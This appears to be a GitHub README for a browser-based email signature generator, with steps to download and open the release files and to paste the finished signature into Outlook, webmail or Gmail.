# 📧 email-signature-generator - Create professional signatures without any signups

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Lunatic-rockcress936/email-signature-generator/releases)

This application creates custom email signatures. It works directly in your web browser. You do not need to create an account or provide an email address. The tool saves your signature as an HTML file on your computer. You then copy this signature into your email client.

## 📥 How to download the software

The software lives on our release page. Follow these steps to get the files on your Windows computer:

1. Visit this page to download: [https://github.com/Lunatic-rockcress936/email-signature-generator/releases](https://github.com/Lunatic-rockcress936/email-signature-generator/releases)
2. Locate the section labeled Assets.
3. Click the link that ends in .zip.
4. Wait for the download to finish.
5. Open your Downloads folder.
6. Right-click the folder and choose Extract All.
7. Open the extracted folder.
8. Double-click the file named index.html.

Your web browser will open. The generator is now ready for use.

## 🎨 How to create a signature

Follow these steps to build your signature:

1. Open the index.html file in your browser.
2. Fill in your name, job title, and phone number in the provided boxes.
3. Add your social media links if you want.
4. Pick a color for your text.
5. Select a font style from the menu.
6. Look at the preview window on the right side of the screen.
7. Press the copy button when the design looks right.

Your signature now sits on your computer clipboard.

## 📬 Adding the signature to your email

Different apps require different setup steps. Use these instructions for common email systems.

### Outlook for Windows

1. Open Outlook.
2. Click File, then click Options.
3. Select Mail in the menu.
4. Click the Signatures button.
5. Click New and type a name for the signature.
6. Click in the Edit Signature box.
7. Press Control and V on your keyboard to paste the signature you copied.
8. Click Save and then OK.

### Apple Mail (if using via web interface)

1. Open your browser and log into your mail account.
2. Go to your settings gear icon.
3. Find the signature section.
4. Paste the design into the text box.
5. Save your changes.

### Gmail

1. Open Gmail.
2. Click the gear icon and select See all settings.
3. Scroll down to the Signature section.
4. Click Create new.
5. Paste your signature into the box.
6. Scroll to the bottom and click Save changes.
